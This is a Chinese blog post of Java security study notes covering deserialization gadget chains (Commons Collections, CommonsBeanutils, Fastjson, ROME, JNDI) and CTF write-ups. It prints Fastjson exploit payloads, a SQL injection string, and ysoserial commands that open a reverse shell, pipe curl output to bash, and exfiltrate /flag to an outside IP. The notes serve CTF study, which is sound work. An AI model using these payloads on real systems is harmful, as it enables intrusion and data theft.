+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200402681.png" srcset="/img/loading.gif" lazyload class="" title="image-20240831200402681">
+
+<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">HashMap#readObject --&gt;  hash(key)  --&gt;  key.hashCode (TiedMapEntry#hashCode) -- &gt; TiedMapEntry#getValue --&gt; this.map.get (LazyMap#get)<br></code></pre></td></tr></table></figure>
+
+<p>为了解决sun.reflect.annotation.AnnotationInvocationHandler#readObject在8u71后的变化</p>
+<p>又回到了如何调用<strong>LazyMap#get</strong>的问题，这里利用了<strong>TiedMapEntry</strong></p>
+<blockquote>
+<p>TiedMapEntry的构造函数传入一个map和一个key，他的getValue方法调用的了map的get方法并且传入</p>
+<p>key</p>
+</blockquote>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830025106763.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830025106763">
+
+<p>同时，直接构造的话会让最后的get进不去，outputMap会多上一个键，需要手动remove</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830031951647.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830031951647">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200132535.png" srcset="/img/loading.gif" lazyload class="" title="image-20240831200132535">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200150705.png" srcset="/img/loading.gif" lazyload class="" title="image-20240831200150705">
+
+<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">利用BadAttributeValueExpException#readObject调用到TiedMapEntry#toString--&gt;TiedMapEntry#getValue--&gt;LazyMap#get<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902161811190.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902161811190">
+
+
+
+<h2 id="CC-shiro"><a href="#CC-shiro" class="headerlink" title="CC shiro"></a>CC shiro</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">通过CC6调用到TiedMapEntry#getValue--&gt;this.map#get--&gt;transfrom(key)<br>CC6直接打LazyMap#get,这里利用TempLatesImpl<br>构造key为一个恶意TempLatesImpl对象，然后invokeTransformer传入newTransformer方法<br></code></pre></td></tr></table></figure>
+
+<p>shiro在链子中存在数组会报错</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830024138826.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830024138826">
+
+<p>首先，从动态加载字节码的知识可知，我们可以如上构造exp</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830032944049.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830032944049">
+
+<p>但是此时仍然是一个数组，有没有办法跳过ConstantTransformer呢？</p>
+<blockquote>
+<p>TiedMapEntry的构造函数传入一个map和一个key，他的getValue方法调用的了map#get–&gt;transfrom(key)</p>
+</blockquote>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830033417841.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830033417841">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200450616.png" srcset="/img/loading.gif" lazyload class="" title="image-20240831200450616">
+
+
+
+
+
+<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>--&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformingComparator</span>#compare--&gt;</span>transfrom<br>PriorityQueue可以调用到java.util.Comparator对象<br></code></pre></td></tr></table></figure>
+
+<p>在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两</p>
+<p>个分⽀版本：</p>
+<ul>
+<li>commons-collections:commons-collections</li>
+<li>org.apache.commons:commons-collections4</li>
+</ul>
+<p>commons-collections4</p>
+<ul>
+<li><p>直接CC6的decorate方法改成lazymap（）即可</p>
+</li>
+<li><p>同时还出现了CC2和CC4链子</p>
+</li>
+</ul>
+<p>！！CC2利用了！！</p>
+<ul>
+<li>java.util.PriorityQueue：<strong>存在反序列化入口，可以调用到java.util.Comparator</strong>对象</li>
+<li>org.apache.commons.collections4.comparators**.TransformingComparator存在compare方法**</li>
+<li><strong>compare方法调用了transfrom</strong></li>
+</ul>
+<p>随后</p>
+<ul>
+<li>CC3.2.2增加了序列化检查</li>
+<li>CC4.1直接禁止了部分transfromer类序列化</li>
+</ul>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200512394.png" srcset="/img/loading.gif" lazyload class="" title="image-20240831200512394">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200526744.png" srcset="/img/loading.gif" lazyload class="" title="image-20240831200526744">
+
+<h2 id="CB"><a href="#CB" class="headerlink" title="CB"></a>CB</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PriorityQueue—-》org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.beanutils</span>.BeanComparator#compare--》递归调用getter方法--》TemplatesImpl#getOutputProperties<br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>CB库的getProperty会调用相应javaBean的getter方法来获取对应的属性，同时支持递归</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042046718.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830042046718">
+</blockquote>
+<p>我们从CC2中知道，PriorityQueue可以调用到java.util.Comparator对象</p>
+<p>CB中存在org.apache.commons.beanutils.BeanComparator#compare:当比较的参数存在值的时候会通过getProperty寻找属性</p>
+<p>而getProperty会<strong>递归调用getter方法</strong></p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042515646.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830042515646">
+
+<p>而在<strong>TemplatesImpl中存在getOutputProperties</strong></p>
+<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp">重点！！后面很多链子都会去找getter链子然后调用到TemplatesImpl<span class="hljs-meta">#getOutputProperties</span><br>之前的链子都是利用TemplatesImpl<span class="hljs-meta">#newTransformer动态加载字节码以及直接invoke调用<span class="hljs-keyword">Runtime</span></span><br></code></pre></td></tr></table></figure>
+
+<p>则只需要让o1为TemplatesImpl，property为OutputProperties</p>
+<p>就可以通过getter调用到<strong>TemplatesImpl#getOutputProperties动态加载字节码</strong></p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042747118.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830042747118">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830043216267.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830043216267">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200549726.png" srcset="/img/loading.gif" lazyload class="" title="image-20240831200549726">
+
+<h2 id="Shiro-CB"><a href="#Shiro-CB" class="headerlink" title="Shiro-CB"></a>Shiro-CB</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">寻找一个可以替代org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.comparators</span>.ComparableComparator的类<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>serialVersionUID不同</li>
+<li>CB缺乏CC依赖（BeanComparator构造函数调用了org.apache.commons.collections.comparators.ComparableComparator）</li>
+</ul>
+<p>问题1：手动设置UID即可</p>
+<p>问题2：通过String.CASE_INSENSITIVE_ORDER获取CaseInsensitiveComparator类，他</p>
+<ul>
+<li>实现 java.util.Comparator 接口</li>
+<li>实现 java.io.Serializable 接口</li>
+<li>Java、shiro或commons-beanutils自带，且兼容性强</li>
+</ul>
+<h2 id="原生链"><a href="#原生链" class="headerlink" title="原生链"></a>原生链</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">HashSet#readObject --&gt; HashSet#put--&gt;动态代理调用AnnotationInvocationHandler#equalsImpl--》TemplateImpl<br>中间需要trick构造HashSet<br></code></pre></td></tr></table></figure>
+
+<p>7u21</p>
+<p>AnnotationInvocationHandler#equalsImpl调用了所有方法</p>
+<p>这里可以想到<strong>动态字节码</strong></p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830044440538.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830044440538">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830044346633.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830044346633">
+
+<p>又根据他的invoke方法，只需要被动态代理的对象被调用equals方法且只有一个参数</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830045043595.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830045043595">
+
+
+
+<p>这里涉及到两个方法的区别，java.util.PriorityQueue调用的是compareTo</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830045157340.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830045157340">
+
+
+
+<p>为了调用到equals方法，想到了不能让键重复的<strong>集合</strong></p>
+<p>在HashSet#readObject –&gt; HashSet#put中</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830050625387.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830050625387">
+
+<p>其中的key是我们传入的可控的对象，而进入到这一步要求<strong>proxy对象的“哈希”，等于TemplateImpl对象的“哈希”。</strong></p>
+<p>trick</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830051014721.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830051014721">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830051429547.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830051429547">
+
+<p>反序列化逻辑如：HashMap中的元素去重，分别是proxy和TemplatesImpl，获取hashcode（）成功触发equals（），调用到代理的equalsImpl，然后遍历this.type的方法也就是TemplatesImpl的方法</p>
+<h2 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h2><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163221805.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902163221805">
+
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>    <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>    <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>    <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure>
+
+<p>a对象缓存绕过，b对象设置autoCommit导致反序列化时设置反射属性</p>
+<p>com.sun.rowset.JdbcRowSetImpl.setAutoCommit() –&gt;com.sun.jndi.rmi.registry.RegistryContext.lookup()</p>
+<ul>
+<li>较低版本JDK(JDNI)</li>
+<li>出网</li>
+</ul>
+<h3 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;a\&quot;:&#123;\n&quot;</span> +<br>    <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;\n&quot;</span> +<br>    <span class="hljs-string">&quot;&#125;,\n&quot;</span> +<br>    <span class="hljs-string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +<br>    <span class="hljs-string">&quot;\&quot;_bytecodes\&quot;:[\&quot;!!!Payload!!!\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;</span>;<br>JSON.parse(payload, Feature.SupportNonPublicField);<br></code></pre></td></tr></table></figure>
+
+<p>构建了一个恶意类，然后base64编码</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902111240803.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902111240803">
+
+
+
+<p>需要开启<code>Feature.SupportNonPublicField</code>，实战中不适用</p>
+<h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>利用的是BCEL</p>
+<ul>
+<li>不需要出网，不需要开启特殊的参数，适用范围较广</li>
+<li>目标需要引入tomcat依赖，虽说比较常见，但也是一种限制</li>
+</ul>
+<h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">toString</span><span class="hljs-literal">--</span><span class="hljs-comment">》getPropertyDescriptors</span><span class="hljs-literal">--</span><span class="hljs-comment">》Templateslmpl</span><br></code></pre></td></tr></table></figure>
+
+<p>用于处理XML数据的库</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902160629272.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902160629272">
+
+<h3 id="EqualBeans-ObjectBean"><a href="#EqualBeans-ObjectBean" class="headerlink" title="EqualBeans(ObjectBean)"></a>EqualBeans(ObjectBean)</h3><p><strong>利用hashmap</strong></p>
+<p>hashmap#readObject–&gt;this.map#hashcode（EqualBeans#hashcode）– &gt;EqualBeans#toString</p>
+<h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p><strong>绕过hashmap</strong></p>
+<p>HashTable#readObject–&gt;this.key#reconstitutionPut–&gt;this.key#hashcode（EqualBeans#hashcode）– &gt;EqualBeans#toString</p>
+<h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>cc链里面调用到toString的方法</p>
+<h2 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h2><h3 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h3><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">InvokerTransform<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">transform</span><span class="hljs-params">()</span></span> -&gt; RMIConnector<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">connect</span><span class="hljs-params">()</span></span> -&gt;&gt; RMIConnector<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">findRMIServerJRMP</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>
+
+<p>RMIConnector#findRMIServerJRMP会将参数进行反序列化<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163728961.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902163728961"></p>
+<p>找到调用它的函数</p>
+<ul>
+<li>path开头&#x2F;stub</li>
+<li>截取后面的为base64参数传入</li>
+</ul>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163815258.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902163815258">
+
+<p>最后找到connect</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163916449.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902163916449">
+
+
+
+<h3 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h3><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902164538301.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902164538301">
+
+
+
+<h3 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h3><p>writeValueAsString是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=jackson&spm=1001.2101.3001.7020">jackson</a>序列化自带的入口，在调用该方法的过程中将会通过遍历的方法将<strong>bean对象中的所有的属性的getter方法进行调用</strong></p>
+<p>而在POJONode父类的父类中中有toString方法，可以触发二次反序列化</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902162927924.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902162927924">
+
+<h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823165315177.png" srcset="/img/loading.gif" lazyload class="" title="image-20240823165315177">
+
+<p>http协议使用loader类，不以&#x2F;结尾则识别为JAR文件，剩下的都是file协议</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823165651906.png" srcset="/img/loading.gif" lazyload class="" title="image-20240823165651906">
+
+<p>顺序：</p>
+<ul>
+<li>寻找已加载以及父加载器</li>
+<li>根据url指定方式读取加载字节码</li>
+<li>处理字节码称为类</li>
+</ul>
+<p><strong>defineclass不会触发类初始化，如果想要利用他执行命令需要设法触发构造函数</strong></p>
+<h2 id="加载字节码"><a href="#加载字节码" class="headerlink" title="加载字节码"></a>加载字节码</h2><p>URLclassloader：<strong>远程加载字节码</strong></p>
+<p>ClassLoader#defineClass：<strong>直接加载字节码</strong>，需要触发构造函数</p>
+<p>TemplatesImpl：底层调用了defineClass，字节码必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 子类</p>
+<p>BCEL ClassLoader：java8u251之前<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828164332170.png" srcset="/img/loading.gif" lazyload class="" title="image-20240828164332170"></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>基础概念</p>
+<p>reference引用：传入类名，工厂名，工厂位置</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104537565.png" srcset="/img/loading.gif" lazyload class="" title="image-20240531104537565">
+
+<p>又由于JNDI可以绑定引用对象，就可以在工厂位置中嵌入恶意代码实现诸注入</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104710069.png" srcset="/img/loading.gif" lazyload class="" title="image-20240531104710069">
+
+<p>在本地开一个存在恶意TestRef的服务器<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104822161.png" srcset="/img/loading.gif" lazyload class="" title="image-20240531104822161"></p>
+<p>逻辑：JNDI服务器绑定了恶意远程对象，客户端调用lookup去查找的时候会触发恶意代码</p>
+<p>同时JNDI也可以去打RMI</p>
+<p>高版本的JDK禁止了调用远程服务器，则需要寻找本地可利用的恶意工厂类（tomcat8的beanfactory反射调用EL表达式）</p>
+<h2 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h2><p>解析json字符串的fastjson库提供了一个将字符串根据@type类型解析为对象的功能</p>
+<p>在处理完字符串之后需要获取类的反序列化器进行反序列化</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601003801739.png" srcset="/img/loading.gif" lazyload class="" title="image-20240601003801739">
+
+<p>最早的版本存在黑名单，但是只过滤某些有bug的类<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004003868.png" srcset="/img/loading.gif" lazyload class="" title="image-20240601004003868"></p>
+<p>自定义的类之后会来到<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004054185.png" srcset="/img/loading.gif" lazyload class="" title="image-20240601004054185"></p>
+<p>会通过一个beaninfo的build方法获取这个类的信息<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004218051.png" srcset="/img/loading.gif" lazyload class="" title="image-20240601004218051"></p>
+<p>遍历三次，分别获取setter，属性，getter（逻辑大概是既然需要处理一个类，那么就需要得到这个类的属性并且知道怎么将他的属性赋值）</p>
+<p>getter需要满足条件（返回值是特定的类）</p>
+<p>若某个属性只有get没有set，反序列化的时候会通过getOnly属性来让他调用get方法<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004441277.png" srcset="/img/loading.gif" lazyload class="" title="image-20240601004441277"></p>
+<p>这个过程中以后一个asmEnable属性，关闭的时候会调用JavaBeanDeserializer，开启则调用自定义的asmFactory作为反序列化，为了调试代码需要把它关闭掉</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601010107546.png" srcset="/img/loading.gif" lazyload class="" title="image-20240601010107546">怎么把它关掉呢？第一次获取setter的时候只允许传入一个参数，则不考虑，第三次获取getter的时候可以利用
+
+<p>与普通序列化漏洞的区别<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240604182647623.png" srcset="/img/loading.gif" lazyload class="" title="image-20240604182647623"></p>
+<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="网鼎杯2020thinkjava"><a href="#网鼎杯2020thinkjava" class="headerlink" title="网鼎杯2020thinkjava"></a>网鼎杯2020thinkjava</h2><p>拿到class文集爱你，放进idea的out目录下反编译</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829223536069.png" srcset="/img/loading.gif" lazyload class="" title="image-20240829223536069">
+
+<p>跟进一下函数，存在注入</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829223921069.png" srcset="/img/loading.gif" lazyload class="" title="image-20240829223921069">
+
+<p>此处利用到jdbc注入</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224027506.png" srcset="/img/loading.gif" lazyload class="" title="image-20240829224027506">
+
+<ul>
+<li><p>#既是sql注释符，又是url中的锚点，jdbc类似url解析</p>
+</li>
+<li><p>由于#后的字符被忽略，前面的数据正常解析</p>
+</li>
+<li><p>#后的数据带入数据库，单引号闭合后注入</p>
+</li>
+</ul>
+<p>同时发现数据库默认myapp<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224529134.png" srcset="/img/loading.gif" lazyload class="" title="image-20240829224529134"></p>
+<p>这里可以利用swaggerUI</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224945197.png" srcset="/img/loading.gif" lazyload class="" title="image-20240829224945197">
+
+<p>于是构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">dbName=myapp#<span class="hljs-string">&#x27; union select group_concat(SCHEMA_NAME)from(information_schema.schemata)#</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>后面都是常规的sql注入 得到用户账密后返回一段cookie，rO0AB开头，怀疑反序列化</p>
+<p>使用bp插件探测java ROME链子</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830000518794.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830000518794">
+
+<p>反弹shell poc</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp/<span class="hljs-number">49.234</span><span class="hljs-number">.59</span><span class="hljs-number">.200</span>/<span class="hljs-number">444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>base64编码后<br><br>java -jar ysoserial-<span class="hljs-built_in">all</span>.jar ROME <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzQuNTkuMjAwLzQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&gt;a.bin<br><br>或者本地写一个<span class="hljs-number">1.</span>txt 然后<br>java -jar ysoserial-<span class="hljs-built_in">all</span>.jar ROME <span class="hljs-string">&quot;curl http://49.234.59.200/1.txt|bash&quot;</span> &gt; a.bin<br></code></pre></td></tr></table></figure>
+
+
+
+<p>curl和ping外带的poc</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>ROME <span class="hljs-string">&quot;curl http://49.234.59.200:666 -d @/flag&quot;</span> &gt; a.<span class="hljs-keyword">bin</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>ROME <span class="hljs-string">&quot;ping dji552.dnslog.cn&quot;</span> &gt; a.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="网鼎杯2020青龙组filejava"><a href="#网鼎杯2020青龙组filejava" class="headerlink" title="网鼎杯2020青龙组filejava"></a>网鼎杯2020青龙组filejava</h2><p>下载路径目录穿越</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830012440699.png" srcset="/img/loading.gif" lazyload class="" title="image-20240830012440699">
+
+<p>&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;web.xml</p>
+<p>然后目录穿越到</p>
+<p>&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes下去下载class文件</p>
+<p>后面是一个xml的cve</p>
+<h2 id="CISCN-2023-deserbug"><a href="#CISCN-2023-deserbug" class="headerlink" title="[CISCN 2023]deserbug"></a>[CISCN 2023]deserbug</h2><p>main函数接受bugstr base解码后反序列化</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094658896.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902094658896">
+
+<p>Myexcept类存在</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094735083.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902094735083">
+
+
+
+<p>联想到CC3</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094810072.png" srcset="/img/loading.gif" lazyload class="" title="image-20240902094810072">
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>java安全</div>
+      <div>http://example.com/2024/12/30/java安全/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>z2zQAQ</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
